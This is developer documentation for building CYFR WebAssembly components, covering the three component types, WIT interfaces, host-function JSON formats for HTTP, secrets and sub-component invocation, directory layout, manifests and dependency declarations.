# Component Guide

A practical guide for developers building WASM components for CYFR.

> **Authoritative Spec**: For the complete component specification, validation rules, and error catalog, see the Locus service documentation.

---

## What is a CYFR Component?

A CYFR component is a WebAssembly module that exports a specific interface defined by CYFR. Components are:

- **Portable**: Run anywhere CYFR runs (cloud, edge, local)
- **Sandboxed**: Execute in isolated environments with capability-based security
- **Composable**: Combine components to build complex workflows
- **Language-agnostic**: Build with any language that compiles to WASM

CYFR uses the [WebAssembly Component Model](https://component-model.bytecodealliance.org/) to define interfaces between components and the host runtime. The Opus runtime targets **WASI Preview 2** — all components should be built with `wasm32-wasip2` and use the Component Model binary format.

---

## Before You Start

### What You'll Need

**To use CYFR (run components, manage secrets/policy):**

| Tool | Install |
|------|---------|
| `cyfr` CLI | `brew install cyfr` |

**To build WASM components (pick your language):**

| Tool | Install |
|------|---------|
| Rust + `cargo-component` | `rustup target add wasm32-wasip2` + `cargo install cargo-component` |
| TinyGo (optional) | `brew install tinygo` |
| `wasm-tools` | `cargo install wasm-tools` |

### Quick Start

```bash
# Install and initialize
brew install cyfr
cyfr init                     # Scaffolds components/, data/, wit/
cyfr up                       # Starts the CYFR server

# Authenticate (if multi-user)
cyfr login
cyfr whoami
```

### Project Layout

After `cyfr init`, your project has:

```
your-project/
├── wit/             # Canonical WIT definitions — copy into your component
│   ├── reagent/     #   Pure compute interface
│   ├── catalyst/    #   I/O interface (HTTP, secrets)
│   └── formula/     #   Composition interface (invoke, MCP)
├── components/      # Your WASM components live here
│   ├── catalysts/
│   ├── reagents/
│   └── formulas/
└── data/
    └── cyfr.db      # Secrets, policies, execution records (.gitignored)
```

- **`wit/`** — Copy the relevant subdirectory into your component's `src/wit/` folder. Always copy, never symlink.
- **`components/`** — Layout: `components/{type}s/{namespace}/{name}/{version}/{type}.wasm`
- **`data/`** — All runtime state. Always `.gitignored`.

### CLI ↔ MCP

Every `cyfr` CLI command maps to an MCP tool call. AI agents use the same interface programmatically.

| CLI Command | MCP Tool | Actions |
|---|---|---|
| `cyfr run` | `execution` | `run`, `list`, `logs`, `cancel` |
| `cyfr secret` | `secret` | `set`, `get`, `delete`, `list`, `grant`, `revoke` |
| `cyfr policy` | `policy` | `get`, `set`, `update_field`, `delete`, `list` |
| `cyfr search/inspect/pull/publish/register` | `component` | `search`, `inspect` (includes dependency tree), `pull`, `publish`, `register` (scan all) |
| `cyfr setup` | `component` | `setup_plan` |
| `cyfr audit` | `audit` | `list`, `export`, `show`, `executions` |
| `cyfr login/logout/whoami` | `session` | `login`, `logout`, `whoami` |

---

## The Three Component Types

Choose the right component type for your use case:

### Capabilities Matrix

| Capability | Reagent | Catalyst | Formula |
|------------|---------|----------|---------|
| Pure compute | Yes | Yes | Yes |
| HTTP (`cyfr:http/fetch`) | No | Yes | No |
| Streaming HTTP (`cyfr:http/streaming`) | No | Yes | No |
| Secrets (`cyfr:secrets/read`) | No | Yes | No |
| Invoke sub-components (`cyfr:formula/invoke`) | No | No | Yes |
| Parallel invoke (`call-batch`/`poll`) | No | No | Yes |
| Call MCP tools (`cyfr:mcp/tools`) | No | No | Yes (optional) |
| Requires Host Policy | No | **Yes** (`allowed_domains`) | **If using MCP** (`mcp.allowed_tools`) |
| Deterministic | Yes | No | Depends on sub-components |

### Reagent

**Purpose**: Pure computation with no side effects.

```
Input -> [Reagent] -> Output
```

**Use when**:
- Transforming data (JSON processing, format conversion)
- Running calculations (math, statistics, scoring)
- Validating or parsing structured data
- Any deterministic operation

**Constraints**:
- No imports allowed (fully isolated)
- Same input always produces same output
- No network, filesystem, or clock access

**Interface**: `cyfr:reagent/compute`

### Catalyst

**Purpose**: Operations requiring external I/O.

```
Input -> [Catalyst] -> (I/O) -> Output
```

**Use when**:
- Calling external APIs
- Reading/writing external data
- Time-sensitive operations
- Non-deterministic operations

**Constraints**:
- Must declare required capabilities
- User must have permission for declared capabilities
- I/O is audited and rate-limited
- HTTP via `cyfr:http/fetch` host function (not `wasi:http/outgoing-handler`)
- **Requires Host Policy with `allowed_domains`** before execution (see [Configuration](#configuration))

**Interface**: `cyfr:catalyst/run`

**Imports**: `cyfr:http/fetch`, `cyfr:http/streaming`, `cyfr:secrets/read`

### Formula

**Purpose**: Composing multiple components into workflows.

```
Input -> [Formula] -> calls cyfr:formula/invoke -> [Sub-Component] -> ...
              |                                          |
         internal logic (loops, conditionals)        returns result
              |
           Output
```

**Use when**:
- Chaining multiple components
- Building multi-step pipelines
- Creating reusable workflows
- Conditional component routing
- Parallel invocation of multiple sub-components via `call-batch` / `poll` / `close`

**Constraints**:
- Cannot perform I/O directly (no HTTP, no secrets)
- Invokes sub-components via `cyfr:formula/invoke` host function (sequential `call` or parallel `call-batch`)
- All orchestration logic lives inside the WASM binary (loops, conditionals, branching)
- Opus intercepts each `invoke` call, executes the referenced component, and returns the result

**Interface**: `cyfr:formula/run`

**Imports**: `cyfr:formula/invoke@0.1.0` (`call`, `call-batch`, `poll`, `poll-all`, `close`)

---

## WIT Interfaces

CYFR defines a canonical WIT package at `wit/` in the project root. Component authors copy the appropriate directory into their project as their `wit/` folder.

### Setup

```bash
# Building a reagent? Copy:
cp -r wit/reagent/ my-project/wit/

# Building a catalyst? Copy:
cp -r wit/catalyst/ my-project/wit/

# Building a formula? Copy:
cp -r wit/formula/ my-project/wit/
```

Components **copy** WIT deps (not symlink). Components must be self-contained for CI, Docker, and registry distribution.

### String-Based JSON Convention

All CYFR interfaces use `string -> string` with JSON-encoded payloads. This maximizes language compatibility — every language with a JSON library can build CYFR components without needing complex WIT record bindings.

### Reagent WIT

`wit/reagent/world.wit` — self-contained, no deps:

```wit
package cyfr:reagent@0.1.0;

interface compute {
    /// Execute a pure computation with JSON input, returning JSON output.
    /// No side effects, no I/O, fully deterministic.
    compute: func(input: string) -> string;
}

world reagent {
    export compute;
}
```

### Catalyst WIT

`wit/catalyst/world.wit`:

```wit
package cyfr:catalyst@0.1.0;

interface run {
    /// Execute the catalyst with JSON input, returning JSON output.
    run: func(input: string) -> string;
}

world catalyst {
    export run;
    import cyfr:http/fetch@0.1.0;
    import cyfr:http/streaming@0.1.0;
    import cyfr:secrets/read@0.1.0;
}
```

Catalysts also include deps under `wit/catalyst/deps/`:

**`deps/cyfr-secrets/read.wit`**:

```wit
package cyfr:secrets@0.1.0;

interface read {
    /// Retrieve a secret by name.
    /// Returns ok(value) on success, or err("access-denied: {name}") if
    /// the secret is not granted to this component.
    get: func(name: string) -> result<string, string>;
}
```

**`deps/cyfr-http/interfaces.wit`**:

```wit
package cyfr:http@0.1.0;

/// Synchronous HTTP request/response
interface fetch {
    request: func(json-request: string) -> string;
}

/// Polling-based streaming HTTP
interface streaming {
    request: func(json-request: string) -> string;
    read: func(handle: string) -> string;
    close: func(handle: string) -> string;
}
```

### Formula WIT

`wit/formula/world.wit` — includes optional MCP access:

```wit
package cyfr:formula@0.1.0;

interface run {
    /// Execute formula orchestration logic with JSON input, returning JSON output.
    run: func(input: string) -> string;
}

/// Host function for invoking sub-components from a Formula.
interface invoke {
    /// Invoke a sub-component synchronously. Request and response are JSON-encoded strings.
    /// Request: {"reference": {...}, "input": {...}, "type": "reagent|catalyst|formula"}
    /// Response: {"status": "completed", "output": {...}} or {"error": {...}}
    call: func(json-request: string) -> string;

    /// Launch multiple sub-component invocations in parallel.
    /// Request: {"invocations": [{"reference": {...}, "input": {...}, "type": "..."},...]}
    /// Response: {"batch": "<handle>", "count": N} or {"error": {...}}
    call-batch: func(json-request: string) -> string;

    /// Poll a single invocation result by index.
    /// Request: {"batch": "<handle>", "index": N}
    /// Response: {"status": "completed"|"pending"|"error", ...}
    poll: func(json-request: string) -> string;

    /// Poll all invocations in a batch.
    /// Request: {"batch": "<handle>"}
    /// Response: {"results": [...], "all_done": true|false}
    poll-all: func(json-request: string) -> string;

    /// Close a batch, killing any running invocations and freeing resources.
    /// Request: {"batch": "<handle>"}
    /// Response: {"ok": true} (always succeeds, idempotent)
    close: func(json-request: string) -> string;
}

world formula {
    export run;
    import invoke;
    import cyfr:mcp/tools@0.1.0;  // Optional: for dynamic MCP access
}
```

### MCP Access WIT (Optional Formula Import)

Formulas can optionally import `cyfr:mcp/tools` to call MCP tools at runtime. This enables dynamic workflows where the Formula discovers components, generates new ones, or interacts with storage.

`wit/formula/deps/cyfr-mcp/mcp.wit`:

```wit
package cyfr:mcp@0.1.0;

interface tools {
    /// Invoke an MCP tool. Deny-by-default.
    /// Request: {"tool": "component", "action": "search", "params": {...}}
    /// Response: {"result": {...}} or {"error": {...}}
    call: func(json-request: string) -> string;
}
```

**Request Format**:

```json
{
  "tool": "component",
  "action": "search",
  "params": {
    "query": "sentiment analysis",
    "type": "reagent"
  }
}
```

**Success Response**:

```json
{
  "result": {
    "components": [
      {"reference": {"registry": "reagent:sentiment:1.0"}, "description": "..."}
    ]
  }
}
```

**Error Response**:

```json
{
  "error": {
    "type": "access-denied",
    "message": "Tool 'secret.get' not in mcp.allowed_tools"
  }
}
```

#### MCP Error Types

| Error Type | Cause |
|------------|-------|
| `access-denied` | Tool not in `mcp.allowed_tools` |
| `invalid_tool` | Unknown tool name |
| `invalid_action` | Unknown action for the tool |
| `invalid_params` | Invalid parameters for the action |
| `tool_error` | Underlying tool execution failed |

> **Host Policy Required**: Formulas using `cyfr:mcp/tools` MUST have Host Policy defining `mcp.allowed_tools`. **Deny-by-default**: unlisted tools are blocked.
```

---

## Component References

When executing or invoking a component, you pass a **reference** that tells Opus how to locate the WASM binary. There are five reference types:

| Type | JSON Format | Resolves To | Use Case |
|------|-------------|-------------|----------|
| `draft` | `{"draft": "draft_abc123def456"}` | In-memory DraftStore | Testing before publish |
| `registry` | `{"registry": "catalyst:my-api:0.1.0"}` | Compendium local registry | Registered and published components |
| `local` | `{"local": "components/.../catalyst.wasm"}` | Filesystem path | Development/debugging |
| `arca` | `{"arca": "artifacts/my-tool.wasm"}` | Arca user storage | Personal artifacts |
| `oci` | `{"oci": "registry.io/org/name:v1"}` | OCI registry | Remote registry (not yet implemented) |

### Usage in Execution

Direct execution via `Opus.Executor.run/4`:

```elixir
# Execute a draft
Opus.Executor.run(ctx, %{"draft" => "draft_a1b2c3d4e5f6g7h8"}, input)

# Execute from local registry
Opus.Executor.run(ctx, %{"registry" => "my-api:0.1.0"}, input, type: :catalyst)

# Execute a local file
Opus.Executor.run(ctx, %{"local" => "components/reagents/local/my-tool/0.1.0/reagent.wasm"}, input)
```

### Usage in Formula Invoke

When a Formula calls `cyfr:formula/invoke.call()`, the reference is embedded in the JSON request:

```json
{
  "reference": {"registry": "catalyst:my-api:0.1.0"},
  "input": {"operation": "models.list", "params": {}},
  "type": "catalyst"
}
```

> **Note**: The `type` field defaults to `"reagent"` if omitted. Always specify `"type": "catalyst"` or `"type": "formula"` explicitly when invoking non-reagent components.

### Component Ref (Derived Identity)

Every execution requires a **component ref** — a short string that uniquely identifies the component for policy enforcement, secret grants, rate limiting, and audit logging. The component ref is derived automatically from the WASM file's path in the canonical directory layout:

```
components/{type}s/{namespace}/{name}/{version}/{type}.wasm
         └──────┘ └──────────┘ └────┘ └───────┘
            │          │          │       │
            └──────────┴──────────┴───────┴──→  {type}:{namespace}.{name}:{version}
```

**Examples:**

| Path | Component Ref |
|------|---------------|
| `components/catalysts/local/gemini/0.1.0/catalyst.wasm` | `catalyst:local.gemini:0.1.0` |
| `components/catalysts/cyfr/stripe/1.0.0/catalyst.wasm` | `catalyst:cyfr.stripe:1.0.0` |
| `components/reagents/local/parser/0.1.0/reagent.wasm` | `reagent:local.parser:0.1.0` |
| `components/formulas/agent/gen-abc/0.1.0/formula.wasm` | `formula:agent.gen-abc:0.1.0` |

> **Note**: The type prefix is **required**. Untyped refs like `namespace.name:version` are rejected with a clear error message. Use the typed format `type:namespace.name:version` (or shorthand `c:`, `r:`, `f:`) to avoid ambiguity.

**The canonical layout is required.** If a WASM file is not in the canonical directory structure, execution will fail with a clear error message explaining the expected layout. There is no fallback — this ensures every component has a deterministic, unique identity for security isolation.

**Why this matters:**

- **Policy isolation**: Each component ref gets its own `allowed_domains`, `rate_limit`, and `timeout` via `Sanctum.PolicyStore.put(component_ref, policy)`
- **Secret grants**: Secrets are granted per component ref — `Sanctum.Secrets.grant(ctx, "API_KEY", "catalyst:local.gemini:0.1.0")` only grants to that specific component
- **Rate limiting**: Rate limits are tracked per `{user_id, component_ref}` pair
- **Audit trail**: Every execution record includes the component ref for forensic analysis

**For tests:** Test setups must create the canonical directory structure in temp dirs. For example:

```elixir
# Correct: creates canonical layout so component ref can be derived
wasm_dir = Path.join(test_path, "catalysts/local/gemini/0.1.0")
File.mkdir_p!(wasm_dir)
wasm_path = Path.join(wasm_dir, "catalyst.wasm")
File.cp!(@wasm_source, wasm_path)
# => component ref: "catalyst:local.gemini:0.1.0"
```

---

## Host Function JSON Formats

### `cyfr:http/fetch` — `request(json-request: string) -> string`

#### Basic Request

```json
{
  "method": "GET",
  "url": "https://api.example.com/data",
  "headers": {"Authorization": "Bearer ..."},
  "body": ""
}
```

#### POST with JSON Body

```json
{
  "method": "POST",
  "url": "https://api.openai.com/v1/chat/completions",
  "headers": {
    "Authorization": "Bearer sk-...",
    "Content-Type": "application/json"
  },
  "body": "{\"model\":\"gpt-4o\",\"messages\":[{\"role\":\"user\",\"content\":\"Hello\"}]}"
}
```

Note: The `body` field is always a **string**. For JSON payloads, serialize the JSON object to a string first.

#### Extended Options

**Base64 body encoding** (for sending binary data):

```json
{
  "method": "POST",
  "url": "...",
  "headers": {...},
  "body": "<base64 encoded data>",
  "body_encoding": "base64"
}
```

**Base64 response encoding** (for receiving binary data):

```json
{
  "method": "GET",
  "url": "...",
  "headers": {...},
  "response_encoding": "base64"
}
```

Response with base64 encoding:

```json
{"status": 200, "headers": {...}, "body": "<base64>", "body_encoding": "base64"}
```

**Multipart/form-data** (for file uploads):

```json
{
  "method": "POST",
  "url": "https://api.openai.com/v1/audio/transcriptions",
  "headers": {"Authorization": "Bearer ..."},
  "multipart": [
    {"name": "file", "filename": "audio.mp3", "content_type": "audio/mpeg", "data": "<base64>"},
    {"name": "model", "value": "whisper-1"}
  ]
}
```

Each multipart part has:
- `name` (required): Field name
- `value` (string): For text fields
- `data` (string): Base64-encoded binary for file fields
- `filename` (string): Original filename
- `content_type` (string): MIME type

#### Success Response

```json
{"status": 200, "headers": {"content-type": "application/json"}, "body": "{...}"}
```

#### Error Response

```json
{"error": {"type": "domain_blocked", "message": "example.com not in allowed_domains"}}
```

#### Error Types

| Error Type | Cause |
|------------|-------|
| `domain_blocked` | URL hostname not in policy `allowed_domains` |
| `method_blocked` | HTTP method not in policy `allowed_methods` |
| `private_ip_blocked` | DNS resolved to private/reserved IP (SSRF prevention) |
| `rate_limited` | Too many requests in time window |
| `request_too_large` | Request body exceeds policy `max_request_size` |
| `response_too_large` | Response body exceeds policy `max_response_size` |
| `dns_error` | DNS resolution failed for hostname |
| `timeout` | Request exceeded 30s timeout |
| `http_error` | Network or HTTP-level failure |

### `cyfr:http/streaming` — Polling-Based Streaming HTTP

For consuming streaming responses (e.g., Server-Sent Events from OpenAI).

#### Protocol Flow

```
1. WASM calls streaming.request(json)  ->  host returns {"handle": "abc123"}
2. WASM calls streaming.read("abc123") ->  host returns {"data": "chunk...", "done": false}
   ... (loop until done) ...
3. WASM calls streaming.read("abc123") ->  host returns {"data": "", "done": true}
4. WASM calls streaming.close("abc123") -> host returns {"ok": true}
```

#### Request

Same format as `cyfr:http/fetch`:

```json
{"method": "POST", "url": "https://api.openai.com/v1/chat/completions", "headers": {...}, "body": "..."}
```

Response:

```json
{"handle": "abc123"}
```

#### Read (loop until done)

```json
// In-progress chunk:
{"data": "data: {\"choices\":[...]}\n\n", "done": false}

// Final chunk (stream complete):
{"data": "", "done": true}
```

#### Close

```json
{"ok": true}
```

#### Streaming Error Response

```json
{"error": {"type": "stream_limit", "message": "Maximum concurrent streams (3) exceeded"}}
```

#### Streaming Error Types

| Error Type | Cause |
|------------|-------|
| `stream_limit` | Exceeded max 3 concurrent streams per execution |
| `timeout` | Stream exceeded 60s timeout |
| `invalid_handle` | Unknown or already-closed stream handle |
| `response_too_large` | Cumulative streamed data exceeds policy `max_response_size` |

All `cyfr:http/fetch` error types (domain_blocked, method_blocked, etc.) also apply to `streaming.request`.

#### Constraints

- Max **3 concurrent streams** per execution
- **60s timeout** per stream (auto-closed after timeout)
- Cumulative response size tracked against policy `max_response_size`
- All streams auto-cleaned when execution completes

### `cyfr:secrets/read` — `get(name: string) -> result<string, string>`

Returns `ok(value)` on success, or `err("access-denied: {name}")` if the secret is not granted to this component.

### `cyfr:formula/invoke` — `call(json-request: string) -> string`

#### Request

```json
{
  "reference": {"registry": "reagent:cyfr.sentiment-analyzer:3.5"},
  "input": {"texts": ["great product", "terrible service"]},
  "type": "reagent"
}
```

The `reference` field accepts any of the five [Component References](#component-references). The `type` field defaults to `"reagent"` if omitted.

#### Success Response

```json
{"status": "completed", "output": {"score": 0.85}}
```

#### Error Response

```json
{"error": {"type": "execution_failed", "message": "Component panicked during execution"}}
```

#### Invoke Error Types

| Error Type | Cause |
|------------|-------|
| `invalid_json` | Request string is not valid JSON |
| `invalid_request` | Missing `reference` (map) or `input` (map) |
| `invalid_type` | `type` field is not `reagent`, `catalyst`, or `formula` |
| `execution_failed` | Sub-component execution failed (timeout, panic, policy violation, etc.) |
| `invalid_handle` | Batch handle not found (expired or never existed) |
| `invalid_index` | Index out of range for the given batch |
| `timeout` | Batch exceeded 300s safety timeout |

### Parallel Invocation (`call-batch` / `poll` / `poll-all` / `close`)

For Formulas that need to invoke multiple independent sub-components concurrently, the parallel invocation functions eliminate sequential blocking. Each sub-invocation runs through the full Executor pipeline (rate limiting, memory limits, timeout, policy) independently.

#### `call-batch` — Launch Parallel Invocations

Request:
```json
{
  "invocations": [
    {"reference": {"registry": "catalyst:local.claude:0.2.0"}, "input": {"prompt": "..."}, "type": "catalyst"},
    {"reference": {"registry": "catalyst:local.openai:0.2.0"}, "input": {"prompt": "..."}, "type": "catalyst"}
  ]
}
```

Response:
```json
{"batch": "aBcDeFgH1234", "count": 2}
```

The `invocations` array must be non-empty. Each item follows the same format as a `call` request (`reference`, `input`, optional `type`). All invocations are spawned concurrently on the host and execute in parallel.

#### `poll` — Check a Single Result

Request:
```json
{"batch": "aBcDeFgH1234", "index": 0}
```

Response (pending):
```json
{"status": "pending"}
```

Response (completed):
```json
{"status": "completed", "output": {"score": 0.85}}
```

Response (error):
```json
{"status": "error", "error": {"type": "execution_failed", "message": "..."}}
```

#### `poll-all` — Check All Results

Request:
```json
{"batch": "aBcDeFgH1234"}
```

Response:
```json
{
  "results": [
    {"index": 0, "status": "completed", "output": {"score": 0.85}},
    {"index": 1, "status": "pending"}
  ],
  "all_done": false
}
```

#### `close` — Cleanup a Batch

Request:
```json
{"batch": "aBcDeFgH1234"}
```

Response:
```json
{"ok": true}
```

Always succeeds. Idempotent — safe to call on already-closed or unknown handles. Kills any still-running invocations and frees all resources.

#### Constraints

- **Batch timeout**: 300s safety net. Batches that exceed this are automatically cleaned up.
- **No batch size limit**: Each sub-invocation goes through the full Executor pipeline, so per-component guardrails (rate limiting, memory, fuel) apply naturally.
- **Partial failure**: If one invocation fails, others continue. Failed results appear as `"status": "error"` in poll responses.

---

## Component Directory Structure

All components — user-developed, first-party, agent-generated, and Compendium-downloaded — follow the same canonical layout:

```
components/
+-- catalysts/
|   +-- cyfr/                            # Verified publisher (pulled from registry)
|   |   +-- stripe/
|   |       +-- 1.0.0/
|   |           +-- src/                 # Source code (Cargo.toml, lib.rs, wit/)
|   |           +-- catalyst.wasm        # Built binary (always named by type)
|   |           +-- cyfr-manifest.json   # Component manifest (required)
|   |           +-- README.md            # Human-readable docs (recommended)
|   +-- local/                           # Human dev created (Cursor, Claude Code, etc.)
|   |   +-- my-tool/
|   |       +-- 0.1.0/
|   |           +-- src/
|   |           +-- catalyst.wasm
|   |           +-- cyfr-manifest.json
|   +-- agent/                           # Brain Formula generated (via build.compile)
|       +-- gen-abc123/
|           +-- 0.1.0/
|               +-- catalyst.wasm
|               +-- cyfr-manifest.json
+-- reagents/
|   +-- cyfr/
|   |   +-- json-transform/
|   |       +-- 1.0.0/
|   |           +-- src/
|   |           +-- reagent.wasm
|   |           +-- cyfr-manifest.json
|   |           +-- README.md
|   +-- local/
|   |   +-- my-reagent/
|   |       +-- 0.1.0/
|   |           +-- src/
|   |           +-- reagent.wasm
|   |           +-- cyfr-manifest.json
|   +-- agent/
|       +-- gen-xyz789/
|           +-- 0.1.0/
|               +-- reagent.wasm
|               +-- cyfr-manifest.json
+-- formulas/
    +-- cyfr/
    |   +-- webhook-processor/
    |       +-- 1.0.0/
    |           +-- src/
    |           +-- formula.wasm
    |           +-- cyfr-manifest.json
    |           +-- README.md
    +-- local/
    |   +-- my-workflow/
    |       +-- 0.1.0/
    |           +-- formula.wasm
    |           +-- cyfr-manifest.json
    +-- agent/
        +-- gen-brain-flow/
            +-- 0.1.0/
                +-- formula.wasm
                +-- cyfr-manifest.json
```

### Namespace Access Model

| Namespace | Created By | Brain Formula Access | Human Dev Access |
|-----------|------------|---------------------|------------------|
| `cyfr/` | Compendium (registry pull) | Search + Pull + Run | Search + Pull + Run |
| `local/` | Human devs (Cursor, Claude Code) | Read + Run only | Read + Write + Run |
| `agent/` | Brain Formula via `build.compile` | **Read + Write + Run** | Read + Run |

> **Agent namespace**: Brain Formulas can only write to `agent/`. This provides a clear trust boundary — agent-generated code is isolated from human-developed and registry-pulled components.

**Key conventions:**

- **Binary named by type**, not by component name: `catalyst.wasm`, `reagent.wasm`, `formula.wasm`
- **Manifest required**: Every component must include `cyfr-manifest.json` (see [Component Manifest](#component-manifest-cyfr-manifestjson))
- **Versions are semver folders**: `1.0.0/`, not `v1.0.0/`
- **Source code** lives in `src/` within each version folder
- **README recommended**: `README.md` alongside the binary for human-readable documentation
- **Same layout** for user-developed, first-party, and Compendium-downloaded components
- **No separate cache layer**: `cyfr pull` places components directly in `components/`. Delete and re-pull if needed.

**Registry references map to local paths:**

| Registry Reference | Local Path |
|---|---|
| `cyfr.run/catalysts/stripe:1.0` | `components/catalysts/cyfr/stripe/1.0.0/catalyst.wasm` |
| `cyfr.run/reagents/json-transform:1.0` | `components/reagents/cyfr/json-transform/1.0.0/reagent.wasm` |
| `cyfr.run/formulas/webhook-processor:1.0` | `components/formulas/cyfr/webhook-processor/1.0.0/formula.wasm` |

**Project-local data:**

All structured data (secrets, policy, logs, API keys, sessions) lives in `data/cyfr.db`. The `data/` directory should be `.gitignored` as it contains encrypted secrets and session tokens.

```
project-root/
+-- components/           # WASM components (by type/publisher/name/version)
+-- data/
|   +-- cyfr.db           # All structured data (SQLite)
+-- ...
```

### What to Include in Version Control

Each component version directory should commit only the files needed to **use** or **rebuild** the component. Build outputs are excluded by `.gitignore`.

**Include:**

| Path | Purpose |
|------|---------|
| `{type}.wasm` | Compiled component binary (catalyst.wasm, formula.wasm, etc.) |
| `cyfr-manifest.json` | Component identity, imports/exports, and metadata |
| `README.md` | Human-readable documentation |
| `src/Cargo.toml` | Rust build manifest |
| `src/Cargo.lock` | Pinned dependency versions |
| `src/src/` | Rust source code |
| `src/wit/` | WIT interface definitions |
| `src/src/bindings.rs` | Generated by `wit-bindgen` — intentionally kept because it's small and required for building without re-running the generator |

**Exclude (handled by `.gitignore`):**

| Path | Reason |
|------|--------|
| `src/target/` | Rust/Cargo build output; regenerated by `cargo component build` |
| `node_modules/` | JS dependency cache (if applicable) |

> The project `.gitignore` contains `components/**/target/` to enforce this automatically.

---

## Component Manifest (`cyfr-manifest.json`)

Every component must include a `cyfr-manifest.json` file alongside its WASM binary. The manifest is a machine-readable description of what the component **is** and **needs** — it is distinct from:

- **`setup` manifest section**: Declares secrets and recommended policy for streamlined onboarding (see [Setup](#setup))
- **Host Policy**: Enforcement rules (rate limits, allowed domains) set by the consumer, not the developer

The manifest travels with the component through the entire lifecycle: local development, draft testing, publishing, and pull.

> **Authoritative source**: The Compendium service documentation defines the manifest format for OCI packaging. This section covers the developer-facing usage.

### Field Reference

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `id` | string | Yes | Ref-style identifier (e.g., `catalyst:local.claude`, `reagent:cyfr.json-transform`) |
| `type` | enum | Yes | `catalyst`, `reagent`, or `formula` |
| `version` | semver | Yes | Semantic version (e.g., `1.0.0`) |
| `description` | string | Yes | Short human-readable description |
| `license` | string | No | SPDX identifier (e.g., `MIT`, `Apache-2.0`) |
| `source` | enum | No | `include` (source shipped), `external` (link to repo), or `none` |
| `wasi` | object | Yes (catalyst) | WASI capability declarations (see below) |
| `setup` | object | No | Onboarding declarations — `setup.secrets` (secret requirements) and `setup.policy` (recommended policy values). See [Setup](#setup). |
| `setup.secrets` | array | No | Secret requirements: each entry has `name` (string), `description` (string), `required` (bool) |
| `setup.policy` | object | No | Recommended policy values (e.g., `allowed_domains`, `rate_limit`, `timeout`) |
| `schema.input` | JSON Schema | Recommended | Expected input format |
| `schema.output` | JSON Schema | Recommended | Output format |
| `defaults` | object | No | Vendor-recommended config values |
| `dependencies` | object | No | Dependency declarations (see [Dependencies](#dependencies)) |
| `examples` | array | No | Sample input/output pairs for consumers |

**`examples` format:**

```json
"examples": [
  {
    "name": "Create a charge",
    "description": "Charges a customer's default payment method",
    "input": { "action": "charge", "amount": 5000, "customer_id": "cus_123" },
    "output": { "success": true, "transaction_id": "txn_456" }
  }
]
```

Each entry has:
- `name` (string, required) — short label
- `description` (string, optional) — context for the example
- `input` (object, required) — sample input payload
- `output` (object, required) — expected output payload

**`wasi` capabilities:**

| Key | Type | Meaning |
|-----|------|---------|
| `http` | bool | Outbound HTTP via `cyfr:http/fetch` |
| `streaming` | bool | Streaming HTTP via `cyfr:http/streaming` |
| `secrets` | bool | Secret access via `cyfr:secrets/read` |
| `logging` | bool | Structured logging |
| `clocks` | bool | Wall-clock / monotonic time |
| `filesystem` | string[] | Filesystem access modes (e.g., `["read"]`) |

### Examples

**Reagent** (minimal — pure compute, no I/O):

```json
{
  "id": "reagent:local.data-processor",
  "type": "reagent",
  "version": "1.2.0",
  "description": "Transforms and validates structured data",
  "license": "MIT",
  "schema": {
    "input": { "type": "object" },
    "output": { "type": "object" }
  }
}
```

Reagents have no `wasi` or `secrets` fields — they are fully isolated with no imports.

**Catalyst** (full — I/O capabilities, secrets, schemas):

```json
{
  "id": "catalyst:cyfr.stripe",
  "type": "catalyst",
  "version": "1.0.0",
  "description": "Stripe payment processing bridge",
  "wasi": {
    "http": true,
    "secrets": true,
    "logging": true,
    "clocks": true
  },
  "setup": {
    "secrets": [
      {
        "name": "STRIPE_API_KEY",
        "description": "Stripe secret key from https://dashboard.stripe.com/apikeys",
        "required": true
      }
    ],
    "policy": {
      "allowed_domains": ["api.stripe.com"],
      "rate_limit": {"requests": 100, "window": "1m"},
      "timeout": "30s",
      "max_memory_bytes": 134217728
    }
  },
  "schema": {
    "input": {
      "type": "object",
      "properties": {
        "action": { "enum": ["charge", "refund", "list"] },
        "amount": { "type": "integer" },
        "customer_id": { "type": "string" }
      }
    },
    "output": {
      "type": "object",
      "properties": {
        "success": { "type": "boolean" },
        "transaction_id": { "type": "string" }
      }
    }
  },
  "defaults": {
    "max_charge_amount": 100000,
    "default_currency": "usd"
  },
  "examples": [
    {
      "name": "Create a charge",
      "description": "Charges a customer's default payment method",
      "input": { "action": "charge", "amount": 5000, "customer_id": "cus_123" },
      "output": { "success": true, "transaction_id": "txn_456" }
    },
    {
      "name": "List charges",
      "input": { "action": "list", "customer_id": "cus_123" },
      "output": { "success": true, "charges": [] }
    }
  ]
}
```

The `setup` section declares everything needed for onboarding: `setup.secrets` lists the secrets the component requires (with descriptions to help users obtain them), and `setup.policy` provides vendor-recommended policy values. The `defaults` block documents hardcoded default values for reference.

**Formula** (mid — composition via host function):

```json
{
  "id": "formula:local.crypto-bot",
  "type": "formula",
  "version": "1.0.0",
  "description": "Orchestrates sentiment analysis and trading execution",
  "license": "MIT",
  "setup": {
    "policy": {
      "timeout": "5m",
      "max_memory_bytes": 67108864,
      "max_request_size": 1048576,
      "max_response_size": 5242880
    }
  },
  "dependencies": {
    "static": [
      {
        "ref": "reagent:cyfr.sentiment:1.0.0",
        "optional": false,
        "reason": "Sentiment analysis for market data"
      },
      {
        "ref": "catalyst:local.exchange:1.0.0",
        "optional": false,
        "reason": "Trading execution API"
      }
    ]
  },
  "schema": {
    "input": {
      "type": "object",
      "properties": {
        "symbol": { "type": "string" },
        "strategy": { "type": "string" }
      }
    },
    "output": {
      "type": "object",
      "properties": {
        "action": { "type": "string" },
        "reason": { "type": "string" }
      }
    }
  }
}
```

Formulas have no `wasi` or `secrets` — they invoke sub-components via `cyfr:formula/invoke`, and each sub-component runs in its own sandbox. The `dependencies` field declares which sub-components the formula needs at runtime.

> **See also**: [Compendium docs](docs/services/compendium.md#component-manifest) for OCI packaging details, [Locus docs](docs/services/locus.md) for capability validation at import time.

---

## Dependencies

Formulas invoke sub-components at runtime via `cyfr:formula/invoke`. The `dependencies` manifest field declares these relationships so the system can **auto-pull** them when you pull a formula and **block execution** if required dependencies are missing.

### Schema

```json
{
  "dependencies": {
    "static": [
      {
        "ref": "catalyst:local.claude:0.1.0",
        "optional": false,
        "reason": "Claude API provider"
      }
    ],
    "dynamic": {
      "discovery": "component.search",
      "description": "Discovers providers at runtime via MCP search",
      "typical_types": ["catalyst"]
    }
  }
}
```

**`dependencies.static[]`** — components known at build time:

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `ref` | string | Yes | Canonical component ref (`type:namespace.name:version`). **Exact version required** — no ranges, no constraints, no `latest` |
| `optional` | bool | No | Default `false`. If `true`, pull warns but doesn't fail; execution proceeds |
